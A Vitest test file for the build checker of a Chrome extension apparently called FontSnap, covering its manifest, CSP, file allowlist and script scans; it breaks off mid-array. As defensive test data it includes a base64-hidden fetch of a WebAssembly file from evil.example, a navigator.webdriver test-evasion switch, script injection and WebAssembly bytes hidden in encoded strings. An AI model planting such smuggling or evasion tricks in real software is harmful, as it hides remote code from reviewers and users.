import { createHash } from 'node:crypto';
import { mkdirSync, mkdtempSync, readFileSync, rmSync, writeFileSync } from 'node:fs';
import { tmpdir } from 'node:os';
import { dirname, join } from 'node:path';
import { afterEach, describe, expect, it } from 'vitest';
import { buildManifest } from '../../src/manifest';
import { VENDOR_FILES, type VendorFile } from '../../scripts/lib/vendor';
import { findEsmSyntax, manifestPages, readBundleFiles, verifyDist } from '../../scripts/lib/dist';
import { EXTENSION_PAGES } from '../../src/shared/constants';
import { ALLOWED_MEDIA, MEDIA_SIGNATURES } from '../../scripts/lib/static-assets';
import { expectedManifest } from '../../scripts/lib/expected-manifest';
import { REAL_CHUNK } from './helpers/runtime-chunk';
import { MEDIA_SAMPLES, PROTOTYPE_NAMES, withMedia } from './helpers/media';
import type { BundleKind } from '../../vite.shared';

const VERSION = '1.0.0';
/** The chunk of src/result/model.ts, the one script that imports (and configures) the vendored runtime. */
const BASE_CHUNK = 'assets/result-base0.js';
const dirs: string[] = [];
afterEach(() => {
  for (const dir of dirs.splice(0)) rmSync(dir, { recursive: true, force: true });
});

type Manifest = Record<string, unknown>;

/**
 * Small stand-ins for the five pinned vendor files, under the real paths of VENDOR_FILES. verifyDist takes the
 * list as an option so that a test dist does not need 47 MB; the real list is checked against a fake dist below.
 */
const VENDOR_BYTES = new Map<string, Buffer>(
  [...VENDOR_FILES.keys()].map((path) => [path, Buffer.from(`bytes of ${path}`)]),
);
const FAKE_VENDOR = new Map<string, VendorFile>(
  [...VENDOR_BYTES].map(([path, bytes]) => [
    path,
    {
      source: 'unused',
      sha256: createHash('sha256').update(bytes).digest('hex'),
      size: bytes.length,
    },
  ]),
);

/** The eight bytes every PNG file starts with (a script cannot). */
const PNG = Buffer.from([0x89, 0x50, 0x4e, 0x47, 0x0d, 0x0a, 0x1a, 0x0a]);

function makeDist(
  options: {
    e2e?: boolean;
    content?: string;
    skip?: string[];
    /** Extra or replaced files (name → text). */
    files?: Record<string, string | Buffer>;
    patch?: (manifest: Manifest) => Manifest;
  } = {},
): string {
  const root = mkdtempSync(join(tmpdir(), 'dist-'));
  dirs.push(root);
  const manifest: Manifest = {
    ...buildManifest({ version: VERSION, e2e: options.e2e ?? false }),
  };
  const files: Record<string, string | Buffer> = {
    'manifest.json': JSON.stringify(options.patch ? options.patch(manifest) : manifest),
    'background.js': 'export {};',
    [BASE_CHUNK]: REAL_CHUNK,
    'select.js': options.content ?? '(function(){})();',
    ...Object.fromEntries(Object.values(EXTENSION_PAGES).map((page) => [page, '<html></html>'])),
    '_locales/en/messages.json': '{}',
    'icons/icon-16.png': PNG,
    'icons/icon-32.png': PNG,
    'icons/icon-48.png': PNG,
    'icons/icon-64.png': PNG,
    'icons/icon-96.png': PNG,
    'icons/icon-128.png': PNG,
    ...Object.fromEntries(VENDOR_BYTES),
    ...options.files,
  };
  for (const [name, content] of Object.entries(files)) {
    if (options.skip?.includes(name)) continue;
    mkdirSync(dirname(join(root, name)), { recursive: true });
    writeFileSync(join(root, name), content);
  }
  return root;
}

/** What the bundler emits for makeDist(): the main build and the content-script build. */
const MAIN: Record<string, BundleKind> = {
  'manifest.json': 'asset',
  'background.js': 'chunk',
  [BASE_CHUNK]: 'chunk',
  ...Object.fromEntries([...VENDOR_BYTES.keys()].map((path) => [path, 'asset' as const])),
  ...Object.fromEntries(Object.values(EXTENSION_PAGES).map((page) => [page, 'asset' as const])),
};
const CONTENT: Record<string, BundleKind> = { 'select.js': 'chunk' };
const BUNDLES = { main: MAIN, content: CONTENT };
const release = { e2e: false, version: VERSION, bundles: BUNDLES, vendor: FAKE_VENDOR };
const e2eBuild = { e2e: true, version: VERSION, bundles: BUNDLES, vendor: FAKE_VENDOR };
/** The same bundles with more files in the main build. */
const withMain = (extra: Record<string, BundleKind>) => ({
  ...release,
  bundles: { main: { ...MAIN, ...extra }, content: CONTENT },
});

describe('findEsmSyntax', () => {
  it.each([
    'import {a} from "./x.js";',
    'import"./x.js";',
    'var a=1;export{a};',
    'export default 1;',
    'const u = import.meta.url;',
  ])('detects module syntax in %j', (source) => {
    expect(findEsmSyntax(source)).toBe(true);
  });

  it.each([
    '(function(){var important=1;return important})();',
    '(function(){const s="import x from y";return s})();',
  ])('does not flag a classic script: %j', (source) => {
    expect(findEsmSyntax(source)).toBe(false);
  });
});

describe('verifyDist', () => {
  it('accepts a complete release build', () => {
    expect(verifyDist(makeDist(), release)).toEqual([]);
  });

  it('reports files referenced by the manifest that are missing', () => {
    const problems = verifyDist(
      makeDist({ skip: ['background.js', 'icons/icon-16.png'] }),
      release,
    );
    expect(problems.join('\n')).toMatch(/background\.js[\s\S]*icon-16\.png/);
  });

  it('reports an ES module content script, which cannot be injected as a file', () => {
    const problems = verifyDist(makeDist({ content: 'import {a} from "./a.js";' }), release);
    expect(problems.join('\n')).toMatch(/select\.js/);
  });

  it('accepts the e2e build only as an e2e build', () => {
    expect(verifyDist(makeDist({ e2e: true }), e2eBuild)).toEqual([]);
    expect(verifyDist(makeDist({ e2e: true }), release).join('\n')).toMatch(/host_permissions/);
    expect(verifyDist(makeDist(), e2eBuild).join('\n')).toMatch(/host_permissions/);
  });

  // Any way for a new capability to reach the shipped manifest (manifest.ts, a Vite plugin,
  // a hand edit) is caught because the whole file is compared with buildManifest().
  it.each([
    [
      'optional_host_permissions',
      (m: Manifest) => ({ ...m, optional_host_permissions: ['<all_urls>'] }),
    ],
    [
      'permissions',
      (m: Manifest) => ({
        ...m,
        permissions: [...(m['permissions'] as string[]), '<all_urls>'],
      }),
    ],
    ['host_permissions', (m: Manifest) => ({ ...m, host_permissions: ['https://*/*'] })],
    [
      'content_scripts',
      (m: Manifest) => ({
        ...m,
        content_scripts: [{ matches: ['<all_urls>'], js: ['select.js'] }],
      }),
    ],
    [
      'externally_connectable',
      (m: Manifest) => ({
        ...m,
        externally_connectable: { matches: ['https://*/*'] },
      }),
    ],
    [
      'web_accessible_resources',
      (m: Manifest) => ({
        ...m,
        web_accessible_resources: [{ resources: ['*'], matches: ['<all_urls>'] }],
      }),
    ],
    [
      'content_security_policy',
      (m: Manifest) => ({
        ...m,
        content_security_policy: {
          extension_pages: "script-src 'self' 'unsafe-eval'",
        },
      }),
    ],
    ['version', (m: Manifest) => ({ ...m, version: '0.9.0' })],
    ['name', (m: Manifest) => ({ ...m, name: 'Renamed' })],
  ])('reports a release manifest that differs in %s', (key, patch) => {
    const problems = verifyDist(makeDist({ patch }), release);
    expect(problems.join('\n')).toContain(`manifest.${key}`);
  });

  it('reports a key that was removed from the manifest', () => {
    const problems = verifyDist(
      makeDist({
        patch: (m) =>
          Object.fromEntries(
            Object.entries(m).filter(([key]) => key !== 'content_security_policy'),
          ),
      }),
      release,
    );
    expect(problems.join('\n')).toContain('manifest.content_security_policy');
  });

  it('reports extra keys in an e2e manifest beyond the loopback host permission', () => {
    const problems = verifyDist(
      makeDist({
        e2e: true,
        patch: (m) => ({ ...m, optional_host_permissions: ['<all_urls>'] }),
      }),
      e2eBuild,
    );
    expect(problems.join('\n')).toContain('manifest.optional_host_permissions');
  });

  it('reports a manifest that is not valid JSON', () => {
    const dir = makeDist();
    writeFileSync(join(dir, 'manifest.json'), '{ nope');
    expect(verifyDist(dir, release).join('\n')).toMatch(/manifest\.json/);
  });
});

describe('verifyDist: an allowlist of files', () => {
  const NOT_ALLOWED = 'not an allowed file';

  // Every one of these once ran, or could run, as code: the extension must never ship them.
  it.each([
    ['a stray script copied from public/', { 'legacy.js': 'alert(1);' }],
    ['a stray module', { 'extra/util.mjs': 'export {};' }],
    ['a stray page', { 'page.html': '<html></html>' }],
    ['a stray stylesheet outside assets/', { 'style.css': 'body{}' }],
    ['an extra json file', { 'data.json': '{}' }],
    ['an extra file next to the icons', { 'icons/logo.svg': '<svg/>' }],
    ['a PNG the manifest does not name', { 'icons/icon-256.png': PNG }],
  ])('rejects %s', (_name, files) => {
    expect(verifyDist(makeDist({ files }), release).join('\n')).toContain(NOT_ALLOWED);
  });

  it.each([
    'assets/extra-abc.txt',
    'assets/extra-abc.json',
    'assets/extra-abc',
    'assets/x.svg',
    'assets/x.png',
    'assets/x.woff2',
    'assets/extra-abc.js.map',
    'assets/x.JS',
    'assets/x.css.js',
  ])(
    'rejects %s even though the bundler emitted it as an asset: only the listed kinds may be assets',
    (file) => {
      const dir = makeDist({
        files: { [file]: 'globalThis.document.title = "x";' },
      });
      const problems = verifyDist(dir, withMain({ [file]: 'asset' })).join('\n');
      expect(problems).toContain(`${file}: ${NOT_ALLOWED}`);
    },
  );

  it('accepts chunks, worker chunks, stylesheets in assets/, pages, locales and the manifest icons', () => {
    const dir = makeDist({
      files: {
        'assets/popup-abc.js': 'export {};',
        'assets/w-abc.js': 'x',
        'assets/s-abc.css': 'a{}',
      },
    });
    const bundles = withMain({
      'assets/popup-abc.js': 'chunk',
      'assets/w-abc.js': 'worker',
      'assets/s-abc.css': 'asset',
    });
    expect(verifyDist(dir, bundles)).toEqual([]);
  });

  it('rejects a worker chunk outside assets/ or without the .js extension', () => {
    for (const file of ['w.js', 'assets/w.txt']) {
      const dir = makeDist({ files: { [file]: 'x' } });
      expect(verifyDist(dir, withMain({ [file]: 'worker' })).join('\n'), file).toContain(
        NOT_ALLOWED,
      );
    }
  });

  it('rejects a chunk that is not JavaScript', () => {
    const dir = makeDist({ files: { 'assets/x.txt': 'x' } });
    expect(verifyDist(dir, withMain({ 'assets/x.txt': 'chunk' })).join('\n')).toContain(
      NOT_ALLOWED,
    );
  });

  it('rejects an icon that is not a PNG', () => {
    const dir = makeDist({
      files: { 'icons/icon-16.png': 'globalThis.x = 1;' },
    });
    expect(verifyDist(dir, release).join('\n')).toContain('icons/icon-16.png: not a PNG file');
  });

  it('rejects a locale file that is not JSON messages', () => {
    const dir = makeDist({
      files: { '_locales/en/messages.json': 'globalThis.x = 1;' },
    });
    expect(verifyDist(dir, release).join('\n')).toContain('_locales/en/messages.json');
  });

  it('wants the content-script build to be exactly { select.js: chunk }', () => {
    const dir = makeDist({ files: { 'assets/w-abc.js': 'x' } });
    for (const content of [
      { 'select.js': 'chunk', 'assets/w-abc.js': 'worker' },
      { 'select.js': 'chunk', 'assets/w-abc.js': 'asset' },
      { 'select.js': 'asset' },
      {},
    ] as Record<string, BundleKind>[]) {
      const problems = verifyDist(dir, {
        ...release,
        bundles: { main: MAIN, content },
      }).join('\n');
      expect(problems, JSON.stringify(content)).toContain('content-script build');
    }
  });

  it('reports a data: URL in a built script, stylesheet or page (inlined bytes of some file)', () => {
    for (const [file, text] of [
      ['assets/popup-abc.js', 'const u="data:text/javascript;base64,YWxlcnQoMSk=";'],
      ['assets/popup-abc.js', 'const u=`data:application/json,{}`;'],
      ['assets/s-abc.css', 'a{background:url(data:image/png;base64,AAAA)}'],
      [EXTENSION_PAGES.result, '<img src="data:image/svg+xml,<svg/>">'],
    ] as const) {
      const dir = makeDist({
        files: { 'assets/s-abc.css': 'a{}', [file]: text },
      });
      const bundles = withMain({
        'assets/popup-abc.js': 'chunk',
        'assets/s-abc.css': 'asset',
      });
      expect(verifyDist(dir, bundles).join('\n'), file).toContain(`${file}: contains a data: URL`);
    }
  });

  it('does not mistake a property named data for a data: URL', () => {
    const dir = makeDist({
      files: { 'assets/popup-abc.js': 'const o={data:1,data: 2};' },
    });
    expect(verifyDist(dir, withMain({ 'assets/popup-abc.js': 'chunk' }))).toEqual([]);
  });

  const page = (body: string) => `<!doctype html><html><head>${body}</head><body></body></html>`;

  it('accepts a module script that points at an emitted chunk', () => {
    const files = {
      [EXTENSION_PAGES.result]: page(
        '<script type="module" crossorigin src="../assets/popup-abc.js"></script>',
      ),
      'assets/popup-abc.js': 'export {};',
    };
    expect(verifyDist(makeDist({ files }), withMain({ 'assets/popup-abc.js': 'chunk' }))).toEqual(
      [],
    );
  });

  it.each([
    ['a script file the bundler did not emit', '<script src="./legacy.js"></script>'],
    ['an inline script', '<script>chrome.storage.sync.set({ minWordLength: 99 });</script>'],
    ['an inline module script', '<script type="module">import "./x.js";</script>'],
    ['an external script', '<script src="https://cdn.example/lib.js"></script>'],
    ['a protocol-relative script', '<script src="//cdn.example/lib.js"></script>'],
    ['a script that is a worker chunk, not an entry', '<script src="../assets/w-abc.js"></script>'],
  ])('rejects %s in an options page', (_name, tag) => {
    const dir = makeDist({
      files: {
        [EXTENSION_PAGES.welcome]: page(tag),
        'legacy.js': 'x',
        'assets/w-abc.js': 'x',
      },
    });
    const problems = verifyDist(dir, withMain({ 'assets/w-abc.js': 'worker' })).join('\n');
    expect(problems).toContain(EXTENSION_PAGES.welcome);
  });
});

describe('readBundleFiles', () => {
  const write = (dir: string, name: string, files: Record<string, BundleKind>) => {
    writeFileSync(join(dir, name), JSON.stringify(files));
  };

  it('reads the lists the main and content builds wrote, per mode', () => {
    const dir = mkdtempSync(join(tmpdir(), 'bundle-'));
    dirs.push(dir);
    write(dir, 'bundle-production-main.json', { 'a.js': 'chunk' });
    write(dir, 'bundle-production-content.json', { 'select.js': 'chunk' });
    write(dir, 'bundle-e2e-main.json', { 'e2e.js': 'asset' });
    write(dir, 'bundle-e2e-content.json', {});
    expect(readBundleFiles(false, dir)).toEqual({
      main: { 'a.js': 'chunk' },
      content: { 'select.js': 'chunk' },
    });
    expect(readBundleFiles(true, dir)).toEqual({
      main: { 'e2e.js': 'asset' },
      content: {},
    });
  });

  it('asks for a build when a list is missing', () => {
    const dir = mkdtempSync(join(tmpdir(), 'bundle-'));
    dirs.push(dir);
    expect(() => readBundleFiles(false, dir)).toThrow(/run the build/);
  });
});

describe('the declared list of pages (EXTENSION_PAGES) is the only source of pages', () => {
  const PAGES = Object.values(EXTENSION_PAGES);

  it('lists html files relative to src/, the result and the welcome page among them', () => {
    expect(EXTENSION_PAGES.result).toBe('result/result.html');
    expect(EXTENSION_PAGES.welcome).toBe('welcome/welcome.html');
    for (const page of PAGES) expect(page, page).toMatch(/^[a-z0-9_-]+\/[a-z0-9_-]+\.html$/);
  });

  it('accepts every listed page that is built, with no change to the guard code', () => {
    expect(verifyDist(makeDist(), release)).toEqual([]);
  });

  it.each(Object.entries(EXTENSION_PAGES))(
    'wants the listed page %s to exist in the build',
    (_name, page) => {
      const problems = verifyDist(makeDist({ skip: [page] }), release).join('\n');
      expect(problems).toContain(page);
    },
  );

  it.each(Object.entries(EXTENSION_PAGES))(
    'wants the listed page %s emitted by the bundler as a page, not copied',
    (_name, page) => {
      const bundles = {
        main: { ...MAIN, [page]: 'chunk' as const },
        content: CONTENT,
      };
      const problems = verifyDist(makeDist(), { ...release, bundles }).join('\n');
      expect(problems).toContain(page);
    },
  );

  it('refuses a page the list does not name, even if the bundler emitted it', () => {
    const dir = makeDist({
      files: { 'unlisted/unlisted.html': '<html></html>' },
    });
    const problems = verifyDist(dir, withMain({ 'unlisted/unlisted.html': 'asset' })).join('\n');
    expect(problems).toContain('unlisted/unlisted.html: not an allowed file');
  });

  it('accepts such a page once the list names it (the one edit of the recipe)', () => {
    const dir = makeDist({
      files: { 'unlisted/unlisted.html': '<html></html>' },
    });
    const bundles = withMain({ 'unlisted/unlisted.html': 'asset' });
    expect(
      verifyDist(dir, {
        ...bundles,
        pages: [...PAGES, 'unlisted/unlisted.html'],
      }),
    ).toEqual([]);
  });

  it('refuses a manifest that names a page the list does not (side panel, overrides, devtools, ...)', () => {
    const patch = (m: Manifest) => ({
      ...m,
      side_panel: { default_path: 'unlisted/unlisted.html' },
    });
    const dir = makeDist({
      patch,
      files: { 'unlisted/unlisted.html': '<html></html>' },
    });
    const problems = verifyDist(dir, withMain({ 'unlisted/unlisted.html': 'asset' })).join('\n');
    expect(problems).toContain(
      'manifest page unlisted/unlisted.html is not in EXTENSION_PAGES (src/shared/constants.ts)',
    );
  });
});

describe('manifestPages', () => {
  it('finds every manifest field that names an html page of the extension', () => {
    expect(
      manifestPages({
        action: { default_popup: 'popup/popup.html' },
        options_ui: { page: 'options/options.html' },
        options_page: 'old/options.html',
        side_panel: { default_path: 'unlisted/unlisted.html' },
        chrome_url_overrides: {
          newtab: 'newtab/newtab.html',
          history: 'h/h.html',
        },
        devtools_page: 'devtools/devtools.html',
        background: { service_worker: 'background.js', page: 'bg/bg.html' },
        sandbox: { pages: ['sandbox/a.html', 'sandbox/b.html'] },
        web_accessible_resources: [
          { resources: ['welcome/w.html', 'img/*.png', 'x.js'], matches: [] },
        ],
        icons: { '16': 'icons/icon-16.png' },
      }).sort(),
    ).toEqual(
      [
        'popup/popup.html',
        'options/options.html',
        'old/options.html',
        'unlisted/unlisted.html',
        'newtab/newtab.html',
        'h/h.html',
        'devtools/devtools.html',
        'bg/bg.html',
        'sandbox/a.html',
        'sandbox/b.html',
        'welcome/w.html',
      ].sort(),
    );
  });

  it('returns nothing for a manifest without pages', () => {
    expect(manifestPages({})).toEqual([]);
  });
});

describe('verifyDist takes media from ALLOWED_MEDIA, the same list as the src/ guard', () => {
  it.each([...MEDIA_SIGNATURES.keys()])(
    'refuses a %s asset until the list names its type, then accepts it, and checks its bytes',
    (extension) => {
      const file = `assets/logo-abc.${extension}`;
      const bundles = withMain({ [file]: 'asset' });
      const sample = MEDIA_SAMPLES.get(extension) ?? Buffer.alloc(0);
      const dir = makeDist({ files: { [file]: sample } });
      const wasListed = ALLOWED_MEDIA.has(extension);
      withMedia([extension], () => {
        expect(verifyDist(dir, bundles)).toEqual([]);
        const fake = makeDist({ files: { [file]: 'globalThis.x = 1;' } });
        expect(verifyDist(fake, bundles).join('\n')).toContain(
          `${file}: does not start like its file type`,
        );
      });
      expect(verifyDist(dir, bundles).join('\n').includes(`${file}: not an allowed file`)).toBe(
        !wasListed,
      );
    },
  );

  // A file named after something every object inherits once passed the dist gate too.
  it.each(PROTOTYPE_NAMES)('refuses evil.%s emitted as an asset, and a file named %s', (name) => {
    for (const file of [`assets/evil-abc.${name}`, `assets/${name}`, name]) {
      const dir = makeDist({
        files: { [file]: 'globalThis.document.title = "PWNED";' },
      });
      const problems = verifyDist(dir, withMain({ [file]: 'asset' })).join('\n');
      expect(problems, file).toContain(`${file}: not an allowed file`);
    }
  });
});

describe('verifyDist: WebAssembly is intentionally not supported', () => {
  it('names WebAssembly when a .wasm file is in the build, as an asset or under another name', () => {
    for (const file of ['assets/m-abc.wasm', 'module.wasm']) {
      const dir = makeDist({ files: { [file]: '\0asm' } });
      const problems = verifyDist(dir, withMain({ [file]: 'asset' })).join('\n');
      expect(problems, file).toContain(`${file}: WebAssembly is intentionally not supported`);
    }
  });

  it('does not accept .wasm as listed media either', () => {
    withMedia(['wasm'], () => {
      const dir = makeDist({ files: { 'assets/m-abc.wasm': '\0asm' } });
      expect(verifyDist(dir, withMain({ 'assets/m-abc.wasm': 'asset' })).join('\n')).toContain(
        'WebAssembly is intentionally not supported',
      );
    });
  });
});

describe('verifyDist and prototype names', () => {
  // The shipped manifest is JSON from outside: a key such as `constructor` or `__proto__` is a key
  // it has, and the expected manifest does not.
  it.each(PROTOTYPE_NAMES)('reports a manifest key named %s', (name) => {
    const dir = makeDist();
    const manifest = JSON.parse(readFileSync(join(dir, 'manifest.json'), 'utf8')) as Manifest;
    writeFileSync(
      join(dir, 'manifest.json'),
      JSON.stringify(manifest).replace(/^\{/, `{${JSON.stringify(name)}:{"x":1},`),
    );
    expect(verifyDist(dir, release).join('\n'), name).toContain(
      `manifest.${name}: expected nothing`,
    );
  });

  it.each(PROTOTYPE_NAMES)('does not read a missing manifest key %s from the prototype', (name) => {
    const dir = makeDist();
    expect(verifyDist(dir, release).join('\n'), name).not.toContain(`manifest.${name}`);
  });

  it.each(PROTOTYPE_NAMES)('treats %s in the bundle report as a plain file name', (name) => {
    const dir = makeDist({ files: { [`assets/${name}.js`]: 'export {};' } });
    const report = JSON.parse(`{"${name}.js":"chunk"}`) as Record<string, BundleKind>;
    const bundles = { main: { ...MAIN, ...report }, content: CONTENT };
    // not under assets/ in the report, so the file in the build is not emitted by the bundler
    expect(verifyDist(dir, { ...release, bundles }).join('\n'), name).toContain(
      `assets/${name}.js: not an allowed file`,
    );
  });

  it('keeps an own __proto__ entry of a bundle report as a file name, not as a prototype', () => {
    const dir = mkdtempSync(join(tmpdir(), 'bundle-'));
    dirs.push(dir);
    writeFileSync(join(dir, 'bundle-production-main.json'), '{"__proto__":"chunk","a.js":"chunk"}');
    writeFileSync(join(dir, 'bundle-production-content.json'), '{"select.js":"chunk"}');
    const { main } = readBundleFiles(false, dir);
    expect(Object.hasOwn(main, '__proto__')).toBe(true);
    expect(Object.getPrototypeOf(main)).toBe(Object.prototype);
  });
});

describe('the message for a file that is not allowed points at the list and the recipe', () => {
  it('names ALLOWED_MEDIA and "Allow a media type", not the guard code', () => {
    const dir = makeDist({ files: { 'assets/inter-abc.woff2': 'x' } });
    const message = verifyDist(dir, withMain({ 'assets/inter-abc.woff2': 'asset' })).join('\n');
    expect(message).toContain('assets/inter-abc.woff2: not an allowed file');
    expect(message).toContain('ALLOWED_MEDIA');
    expect(message).toContain('scripts/lib/static-assets.ts');
    expect(message).toContain('Allow a media type');
    expect(message).not.toContain('scripts/lib/dist.ts');
  });
});

// FontSnap's exceptions to the template rules, and the manifest it promises. Each case is a way the shipped
// extension could silently get more powerful; each must fail the check of the built directory.
describe('verifyDist: the FontSnap manifest and its narrow WebAssembly exceptions', () => {
  const asRecord = (value: unknown) => value as Record<string, unknown>;

  it('accepts the hand-written release manifest of FontSnap, exactly', () => {
    expect(verifyDist(makeDist({ patch: () => expectedManifest(VERSION) }), release)).toEqual([]);
  });

  it.each([
    [
      'the permission "tabs"',
      (m: Manifest) => ({ ...m, permissions: [...(m['permissions'] as string[]), 'tabs'] }),
      'permissions',
    ],
    [
      'a missing permission',
      (m: Manifest) => ({ ...m, permissions: ['activeTab', 'scripting', 'storage'] }),
      'permissions',
    ],
    [
      'host_permissions <all_urls>',
      (m: Manifest) => ({ ...m, host_permissions: ['<all_urls>'] }),
      'host_permissions',
    ],
    [
      'optional_permissions',
      (m: Manifest) => ({ ...m, optional_permissions: ['tabs'] }),
      'optional_permissions',
    ],
    [
      'optional_host_permissions',
      (m: Manifest) => ({ ...m, optional_host_permissions: ['https://*/*'] }),
      'optional_host_permissions',
    ],
    [
      'content_scripts',
      (m: Manifest) => ({
        ...m,
        content_scripts: [{ matches: ['<all_urls>'], js: ['select.js'] }],
      }),
      'content_scripts',
    ],
    [
      'another shortcut',
      (m: Manifest) => ({
        ...m,
        commands: { _execute_action: { suggested_key: { default: 'Alt+Shift+G' } } },
      }),
      'commands',
    ],
    [
      'a minimum_chrome_version',
      (m: Manifest) => ({ ...m, minimum_chrome_version: '120' }),
      'minimum_chrome_version',
    ],
    ['another version', (m: Manifest) => ({ ...m, version: '0.1.1' }), 'version'],
  ])('reports %s', (_what, patch, key) => {
    expect(verifyDist(makeDist({ patch }), release).join('\n')).toContain(`manifest.${key}`);
  });

  const CSP =
    "script-src 'self' 'wasm-unsafe-eval'; connect-src 'self'; object-src 'none'; base-uri 'none'";
  it.each([
    [
      "'unsafe-eval' instead of 'wasm-unsafe-eval'",
      CSP.replace("'wasm-unsafe-eval'", "'unsafe-eval'"),
    ],
    ["'wasm-unsafe-eval' removed", CSP.replace(" 'wasm-unsafe-eval'", '')],
    ['both eval flavours', CSP.replace("'wasm-unsafe-eval'", "'wasm-unsafe-eval' 'unsafe-eval'")],
    [
      'an extra script source',
      CSP.replace("'wasm-unsafe-eval'", "'wasm-unsafe-eval' https://cdn.example.com"),
    ],
    ["'unsafe-inline'", CSP.replace("'wasm-unsafe-eval'", "'wasm-unsafe-eval' 'unsafe-inline'")],
    ['a default-src', `default-src 'self'; ${CSP}`],
    // the review of PR #6 asked for these three, and the wildcard: each one reopens a door
    ['connect-src removed', CSP.replace(" connect-src 'self';", '')],
    ["connect-src '*'", CSP.replace("connect-src 'self'", 'connect-src *')],
    ['connect-src with https:', CSP.replace("connect-src 'self'", "connect-src 'self' https:")],
    ['connect-src with data:', CSP.replace("connect-src 'self'", "connect-src 'self' data:")],
    ['connect-src with blob:', CSP.replace("connect-src 'self'", "connect-src 'self' blob:")],
    [
      'connect-src with a host',
      CSP.replace("connect-src 'self'", "connect-src 'self' https://cdn.example.com"),
    ],
    ['connect-src none', CSP.replace("connect-src 'self'", "connect-src 'none'")],
    ["object-src 'self' (the old value)", CSP.replace("object-src 'none'", "object-src 'self'")],
    ['object-src removed', CSP.replace(" object-src 'none';", '')],
    ['base-uri removed', CSP.replace("; base-uri 'none'", '')],
    ["base-uri 'self'", CSP.replace("base-uri 'none'", "base-uri 'self'")],
    ['the old CSP', "script-src 'self' 'wasm-unsafe-eval'; object-src 'self'"],
    [
      'the directives in another order',
      "connect-src 'self'; script-src 'self' 'wasm-unsafe-eval'; object-src 'none'; base-uri 'none'",
    ],
    ['a trailing semicolon', `${CSP};`],
    ['different spacing', CSP.replace('script-src ', 'script-src  ')],
    ['an extra directive', `${CSP}; form-action 'none'`],
    ['an extra img-src', `${CSP}; img-src *`],
  ])('reports a CSP with %s (the string must be equal, not "contain")', (_what, csp) => {
    const patch = (m: Manifest) => ({ ...m, content_security_policy: { extension_pages: csp } });
    expect(verifyDist(makeDist({ patch }), release).join('\n')).toContain(
      'manifest.content_security_policy',
    );
  });

  it('accepts the exact CSP', () => {
    const patch = (m: Manifest) => ({ ...m, content_security_policy: { extension_pages: CSP } });
    expect(verifyDist(makeDist({ patch }), release)).toEqual([]);
  });

  it.each([
    [
      'COEP removed',
      (m: Manifest) =>
        Object.fromEntries(Object.entries(m).filter(([k]) => k !== 'cross_origin_embedder_policy')),
      'cross_origin_embedder_policy',
    ],
    [
      'COEP require-corp',
      (m: Manifest) => ({ ...m, cross_origin_embedder_policy: { value: 'require-corp' } }),
      'cross_origin_embedder_policy',
    ],
    [
      'COOP removed',
      (m: Manifest) =>
        Object.fromEntries(Object.entries(m).filter(([k]) => k !== 'cross_origin_opener_policy')),
      'cross_origin_opener_policy',
    ],
    [
      'COOP same-origin-allow-popups',
      (m: Manifest) => ({
        ...m,
        cross_origin_opener_policy: { value: 'same-origin-allow-popups' },
      }),
      'cross_origin_opener_policy',
    ],
  ])('reports %s', (_what, patch, key) => {
    expect(verifyDist(makeDist({ patch }), release).join('\n')).toContain(`manifest.${key}`);
  });

  it('keeps the release manifest free of host permissions while the e2e one has only the loopback one', () => {
    const e2e = asRecord(buildManifest({ version: VERSION, e2e: true }));
    expect(e2e['host_permissions']).toEqual(['http://127.0.0.1/*']);
    expect(asRecord(expectedManifest(VERSION))['host_permissions']).toBeUndefined();
  });

  it.each([
    'tests/unit/x.test.ts',
    'tests/e2e/x.spec.ts',
    'python/fontsnap_ref/pipeline.py',
    'data/realset3/labels.csv',
    'out/py_realset3.json',
    'store/privacy-policy.md',
    'src/background/index.ts',
    'scripts/zip.ts',
    'assets/result-abc.js.map',
    'select.js.map',
    'README.md',
  ])('refuses %s, which must never be in the Chrome Web Store zip', (file) => {
    const dir = makeDist({ files: { [file]: 'x' } });
    expect(verifyDist(dir, release).join('\n')).toContain(`${file}: not an allowed file`);
  });

  // WebAssembly smuggled into a built script, or onnxruntime-web pointed at other code (review of PR #6): the build
  // must refuse it whatever the spelling; the pinned vendor files are exempt by exact path and sha256 only.
  describe('WebAssembly bytes and runtime settings in built scripts', () => {
    const LEGIT = REAL_CHUNK;
    const RESULT = 'assets/result-abc.js';
    const problemsOf = (files: Record<string, string>) =>
      verifyDist(
        makeDist({ files, skip: [BASE_CHUNK] }),
        withMain(Object.fromEntries(Object.keys(files).map((file) => [file, 'chunk' as const]))),
      ).join('\n');

    it('accepts the legitimate result chunk as terser emits it', () => {
      expect(problemsOf({ [RESULT]: LEGIT })).toBe('');
    });

    it.each([
      ['a URL in base64', `${LEGIT};fetch(atob("aHR0cHM6Ly9ldmlsLmV4YW1wbGUvYi53YXNt"))`],
      ['a .wasm name in hex', `${LEGIT};fetch("0a622e7761736d")`],
      ['a Worker', `${LEGIT};new Worker("w.js")`],
      ['XMLHttpRequest', `${LEGIT};new XMLHttpRequest()`],
      ['resource timing emptied', `${LEGIT};performance.setResourceTimingBufferSize(0)`],
      ['a test-or-user switch', `${LEGIT};if(navigator.webdriver)run()`],
      ['btoa outside the service worker', `${LEGIT};btoa(x)`],
    ])('rejects %s in a chunk of the build', (_what, code) => {
      expect(problemsOf({ [RESULT]: code })).toMatch(/decodes to|uses /);
    });

    it.each([
      ['select.js', 'void window.fetch("https://example.invalid/m");'],
      ['select.js', 'new Request("https://example.invalid/m");'],
      ['assets/welcome-abc.js', 'fetch(u);'],
      ['assets/other-abc.js', 'fetch(u);'],
    ])('rejects fetch and Request in %s: outside the CSP or not needed there', (file, code) => {
      const problems = verifyDist(
        makeDist({ files: { [file]: code } }),
        withMain({ [file]: 'chunk' }),
      ).join('\n');
      expect(problems).toMatch(/uses (fetch|Request)/);
    });

    it('lets the service worker encode the screenshot, and nobody else', () => {
      const encode = 'const e=btoa(String.fromCharCode(...b));';
      expect(
        verifyDist(makeDist({ files: { 'background.js': encode } }), release).join('\n'),
      ).not.toContain('uses btoa');
    });

    it('accepts it whatever its hash, but only one chunk may import the runtime', () => {
      expect(problemsOf({ 'assets/result-zzz.js': LEGIT })).toBe('');
      const two = problemsOf({ [RESULT]: LEGIT, 'assets/other-abc.js': LEGIT });
      expect(two).toContain('imports the vendored runtime');
      const none = problemsOf({ 'assets/x-abc.js': 'export const a=1;' });
      expect(none).toContain('imports the vendored runtime');
    });

    it.each([
      ['a decimal byte list', 'new Uint8Array([0,97,115,109,1,0,0,0])'],
      ['base64', 'const w="AGFzbQEAAAA=";'],
      ['an escape', 'const w="\\0asm";'],
      ['a \\x00 escape', 'const w="\\x00asm";'],
      ['a hex string', 'const w="0061736d01000000";'],
